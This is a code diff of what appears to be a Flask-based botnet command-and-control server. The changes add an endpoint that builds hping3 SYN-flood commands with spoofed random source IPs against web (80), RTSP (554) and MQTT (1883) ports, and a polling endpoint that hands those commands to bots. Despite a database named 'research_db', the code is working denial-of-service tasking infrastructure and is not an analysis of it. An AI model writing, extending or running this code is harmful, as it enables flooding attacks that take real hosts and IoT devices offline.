@@ -11,6 +11,7 @@ import time
 from datetime import datetime
 import logging
 from werkzeug.serving import make_server
+import json
 
 app = Flask(__name__)
 
@@ -359,68 +360,118 @@ def bot_checkin():
 
 @app.route('/get-command/<bot_ip>', methods=['GET'])
 def get_command(bot_ip):
-    """Get command for bot"""
+    """Get the latest command for a bot"""
     try:
-        conn = sqlite3.connect('research_db.sqlite')
-        cursor = conn.cursor()
-        
-        # Get latest command for bot
-        cursor.execute('''SELECT id, command, target_ip, attack_type 
-                    FROM commands 
-                    WHERE target_ip = ? AND status = 'pending'
-                    ORDER BY timestamp DESC LIMIT 1''', (bot_ip,))
-        result = cursor.fetchone()
-        
-        if result:
-            command_id, command, target, attack_type = result
-            command_data = {
-                'command_id': command_id,
-                'command': command,
-                'target': target,
-                'attack_type': attack_type
-            }
+        with db_manager.db_lock:
+            conn = db_manager.get_connection()
+            cursor = conn.cursor()
             
-            # Update command status
-            cursor.execute('''UPDATE commands 
-                        SET status = 'executing' 
-                        WHERE id = ?''', (command_id,))
-            conn.commit()
+            # Get the latest pending command
+            cursor.execute('''
+                SELECT id, command, target_ip, attack_type
+                FROM commands
+                WHERE status = 'pending'
+                ORDER BY id DESC
+                LIMIT 1
+            ''')
             
-            return jsonify(command_data)
-        
-        conn.close()
-        return jsonify(None)
-        
+            command = cursor.fetchone()
+            
+            if command:
+                command_id, command_data, target_ip, attack_type = command
+                
+                # Update command status to 'executing'
+                cursor.execute('''
+                    UPDATE commands
+                    SET status = 'executing'
+                    WHERE id = ?
+                ''', (command_id,))
+                
+                conn.commit()
+                conn.close()
+                
+                return jsonify({
+                    'command_id': command_id,
+                    'command': json.loads(command_data),
+                    'target_ip': target_ip,
+                    'attack_type': attack_type
+                })
+            
+            conn.close()
+            return jsonify({'status': 'no_command'})
+            
     except Exception as e:
-        logging.error(f"Error getting command: {e}")
+        logging.error(f"Failed to get command for bot {bot_ip}: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/start-attack', methods=['POST'])
 def start_attack():
-    """Start DDoS attack"""
+    """Start a DDoS attack by translating the request into hping3 commands"""
     try:
-        data = request.json
-        bot_ip = data.get('bot_ip')
+        data = request.get_json()
         target = data.get('target')
         attack_type = data.get('attack_type', 'syn')
         
-        if not all([bot_ip, target]):
-            return jsonify({'error': 'Missing required parameters'}), 400
-        
-        # Add command to database
-        conn = sqlite3.connect('research_db.sqlite')
-        cursor = conn.cursor()
-        cursor.execute('''INSERT INTO commands 
-                    (command, target_ip, attack_type, status, timestamp)
-                    VALUES (?, ?, ?, 'pending', datetime('now'))''',
-                 (f"start_ddos {target} {attack_type}", bot_ip, attack_type))
-        conn.commit()
-        conn.close()
-        
-        return jsonify({'message': f'Attack command sent to {bot_ip}'})
+        if not target:
+            return jsonify({'error': 'Target IP required'}), 400
+            
+        # Translate attack request into hping3 command
+        if attack_type == 'syn':
+            command = {
+                'type': 'ddos',
+                'tool': 'hping3',
+                'args': [
+                    '-S',              # SYN flood
+                    '-p', '80',        # Target port
+                    '--flood',         # Flood mode
+                    '--rand-source',   # Random source IPs
+                    target
+                ]
+            }
+        elif attack_type == 'rtsp':
+            command = {
+                'type': 'ddos',
+                'tool': 'hping3',
+                'args': [
+                    '-S',              # SYN flood
+                    '-p', '554',       # RTSP port
+                    '--flood',         # Flood mode
+                    '--rand-source',   # Random source IPs
+                    target
+                ]
+            }
+        elif attack_type == 'mqtt':
+            command = {
+                'type': 'ddos',
+                'tool': 'hping3',
+                'args': [
+                    '-S',              # SYN flood
+                    '-p', '1883',      # MQTT port
+                    '--flood',         # Flood mode
+                    '--rand-source',   # Random source IPs
+                    target
+                ]
+            }
+        else:
+            return jsonify({'error': 'Invalid attack type'}), 400
+            
+        # Store command in database
+        with db_manager.db_lock:
+            conn = db_manager.get_connection()
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO commands (command, target_ip, attack_type, status)
+                VALUES (?, ?, ?, 'pending')
+            ''', (json.dumps(command), target, attack_type))
+            command_id = cursor.lastrowid
+            conn.commit()
+            conn.close()
+            
+        logging.info(f"Attack command created: {command} against {target}")
+        return jsonify({'status': 'success', 'command_id': command_id})
         
     except Exception as e:
-        logging.error(f"Error starting attack: {e}")
+        logging.error(f"Failed to start attack: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/stop-attack', methods=['POST'])
